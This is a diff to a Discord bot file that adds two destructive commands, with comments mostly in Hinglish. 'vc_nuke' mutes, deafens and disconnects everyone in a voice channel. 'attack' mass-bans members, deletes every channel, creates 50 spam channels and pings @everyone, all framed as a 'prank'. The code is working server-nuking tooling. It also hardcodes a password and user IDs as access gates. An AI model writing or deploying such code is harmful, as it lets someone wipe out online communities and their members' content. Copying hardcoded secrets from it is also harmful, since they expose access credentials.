@@ -17977,7 +17977,210 @@ async def connect(interaction: discord.Interaction, text: str = None):
 
     except Exception as e:
         await interaction.followup.send(f"⚠️ Error: {e}", ephemeral=True)
+
+
+# ================= ☢️ COMMAND: VC NUKE (MUTE + DEAFEN + DISCONNECT) =================
+@titan_group.command(name="vc_nuke", description="☢️ NUCLEAR ATTACK: Mute + Deafen + Disconnect EVERYONE in VC")
+async def vc_nuke(interaction: discord.Interaction):
+    # 1. Security Check
+    if not check_owner(interaction):
+        return await interaction.response.send_message("❌ **Access Denied:** Ye button dabane ki aukaat nahi hai teri! 😂", ephemeral=True)
+
+    # 2. Check if User is in VC
+    if not interaction.user.voice:
+        return await interaction.response.send_message("⚠️ Abe khud toh VC mein aa pehle! Kisko udayega?", ephemeral=True)
+
+    # 3. Defer (Loading...)
+    # Ye zaroori hai kyunki agar VC mein 50 log hue toh time lag sakta hai
+    await interaction.response.defer()
+
+    try:
+        # Target Channel
+        channel = interaction.user.voice.channel
+        members = channel.members
+        victim_count = 0
+
+        # 4. Action Loop (Tabahi Shuru) 😈
+        for member in members:
+            # SAFETY LOCK: Khud ko ya dusre bots ko mat udao (Optional)
+            if member.id == interaction.user.id:
+                continue 
+            
+            # Check Permissions (Bot unhe kick kar sakta hai ya nahi)
+            if member.top_role >= interaction.guild.me.top_role:
+                continue # Agar wo bot se powerfull hai toh skip karo
+
+            try:
+                # STEP A: Mute & Deafen (Psychological Damage)
+                await member.edit(mute=True, deafen=True)
+                
+                # STEP B: Disconnect (Physical Damage)
+                await member.move_to(None) # None ka matlab "Kick from VC"
+                
+                victim_count += 1
+                # Thoda sa delay taaki discord rate limit na de
+                await asyncio.sleep(0.5) 
+                
+            except Exception as e:
+                print(f"Failed to nuke {member.name}: {e}")
+
+        # 5. Success Embed
+        embed = create_premium_embed(
+            "☢️ VC NUKE DETONATED SUCCESSFUL",
+            f"**Target VC:** {channel.name}\n**Casualties:** {victim_count} people kicked.\n**Status:** The area is now clear.",
+            0xFF0000 # Blood Red Color
+        )
+        # GIF lagaya hai taaki feel aaye
+        embed.set_image(url="https://media1.tenor.com/m/X9k8Dqvk98AAAAAC/nuclear-explosion-bomb.gif")
         
+        await interaction.followup.send(embed=embed)
+
+    except Exception as e:
+        await interaction.followup.send(f"⚠️ Nuke Failed: {e}", ephemeral=True)
+
+    
+import discord
+from discord import app_commands
+import asyncio
+
+# ==========================================
+# ⚙️ SECURITY CONFIGURATION
+# ==========================================
+
+# 🛑 JINKO ACCESS DENA HAI UNKI ID YAHAN DALO (Comma laga kar)
+ALLOWED_USER_IDS = [
+    804687084249284618,  # <--- Tumhari ID
+    1169492860278669312    # <--- Dost ki ID (Optional)
+]
+
+# 🔑 NUCLEAR PASSWORD
+NUCLEAR_PASSWORD = "golugolu@123"
+
+# ==========================================
+# 🔒 UI CLASSES (POPUP & BUTTONS)
+# ==========================================
+
+# 1. PASSWORD FORM (MODAL)
+class NukePasswordModal(discord.ui.Modal, title="🔒 Security Clearance"):
+    answer = discord.ui.TextInput(
+        label="Enter Nuclear Code", 
+        style=discord.TextStyle.short, 
+        placeholder="Password likho...", 
+        required=True
+    )
+
+    async def on_submit(self, interaction: discord.Interaction):
+        # Password Check
+        if self.answer.value != NUCLEAR_PASSWORD:
+            return await interaction.response.send_message("❌ **Wrong Password!** Access Denied. 🚨", ephemeral=True)
+
+        # Password Sahi Hai -> FINAL BUTTON dikhao
+        embed = discord.Embed(
+            title="☢️ FINAL WARNING: CODE ACCEPTED",
+            description="**ARE YOU SURE?**\nClicking Launch will **WIPE** this server.\nThis cannot be undone.",
+            color=0xFF0000 # Red
+        )
+        await interaction.response.send_message(embed=embed, view=FinalLaunchView(), ephemeral=True)
+
+# 2. PEHLA CONFIRM BUTTON (Are you sure?)
+class FirstConfirmView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=30)
+
+    @discord.ui.button(label="YES, I want to Destroy", style=discord.ButtonStyle.danger, emoji="⚠️")
+    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.send_modal(NukePasswordModal())
+
+# 3. FINAL LAUNCH BUTTON (The Big Red Button)
+class FinalLaunchView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=30)
+
+    @discord.ui.button(label="🚀 LAUNCH NUCLEAR ATTACK", style=discord.ButtonStyle.danger, emoji="☢️")
+    async def launch(self, interaction: discord.Interaction, button: discord.ui.Button):
+        # YAHAN SE TABAHI SHURU
+        guild = interaction.guild
+        
+        # User ko bata do ki missile nikal gayi
+        await interaction.response.edit_message(content="🚀 **MISSILES LAUNCHED!** Destruction in 3.. 2.. 1..", view=None, embed=None)
+        
+        # === 💀 EXECUTION PHASE (MAX SPEED) ===
+        
+        # 1. SPEED BAN (Parallel Execution - No Sleep)
+        ban_tasks = []
+        members = guild.members # Cache members
+        
+        for member in members:
+            # SAFETY: List wale logon ko, Bot ko, aur Server Owner ko mat ban karo
+            if member.id in ALLOWED_USER_IDS or member.id == interaction.client.user.id or member.id == guild.owner_id:
+                continue
+            
+            # Check Hierarchy (Kya bot isko ban kar sakta hai?)
+            if member.top_role >= guild.me.top_role:
+                continue 
+            
+            # Task list me daalo (Execute baad me karenge ek saath)
+            ban_tasks.append(member.ban(reason="Nuke Attack Executed 💀"))
+
+        # Fire All Ban Requests at Once
+        if ban_tasks:
+            asyncio.create_task(asyncio.gather(*ban_tasks, return_exceptions=True))
+
+        # 2. DELETE CHANNELS (Parallel Execution)
+        del_tasks = []
+        channels = guild.channels # Cache channels
+        
+        for channel in channels:
+            del_tasks.append(channel.delete())
+        
+        # Fire All Delete Requests
+        if del_tasks:
+            asyncio.create_task(asyncio.gather(*del_tasks, return_exceptions=True))
+
+        # 3. SPAM CHANNELS (Parallel Creation)
+        spam_tasks = []
+        # 50 Channels ek saath create honge
+        for i in range(50):
+            spam_tasks.append(guild.create_text_channel("😂-prank-ho-gya-tumhare-saath"))
+        
+        # Fire Creation Requests
+        # Note: Hum 'await' kar rahe hain taaki ping karne ke liye channel mil jaye
+        try:
+            await asyncio.gather(*spam_tasks, return_exceptions=True)
+        except:
+            pass
+
+        # 4. FINAL PING
+        # Naye channels me se kisi ek me ping karo
+        await asyncio.sleep(2) # Thoda ruk ke taaki channels ban jayein
+        try:
+            for channel in guild.text_channels:
+                await channel.send("@everyone **SERVER KHATAM! TATA BYE BYE!** 😂😂😂\n**Prank Ho Gaya!**")
+                # Bas ek baar ping kafi hai, loop break karo
+                break 
+        except:
+            pass
+
+# ==========================================
+# 🚀 COMMAND REGISTRATION
+# ==========================================
+
+@titan_group.command(name="attack", description="☢️ DESTROY SERVER (ID Locked + Password Protected)")
+async def attack(interaction: discord.Interaction):
+    # 🔒 STEP 1: ID CHECK (List me check karega)
+    if interaction.user.id not in ALLOWED_USER_IDS:
+        # Fake loading...
+        await interaction.response.send_message("🔍 Checking Database...", ephemeral=True)
+        await asyncio.sleep(2)
+        return await interaction.edit_original_response(content="❌ **Access Denied:** You are not in the Boss List.")
+
+    # 🔒 STEP 2: FIRST CONFIRMATION
+    embed = discord.Embed(
+        title="⚠️ SECURITY ALERT: ATTACK PROTOCOL",
+        description="You are about to initiate a **Server Wipe**.\nDo you want to proceed?",
+        color=0xFFA500 # Orange
+    )
+    await interaction.response.send_message(embed=embed, view=FirstConfirmView(), ephemeral=True)
 
 # ================== OPTIMIZED FLASK BACKEND ==================
 import os
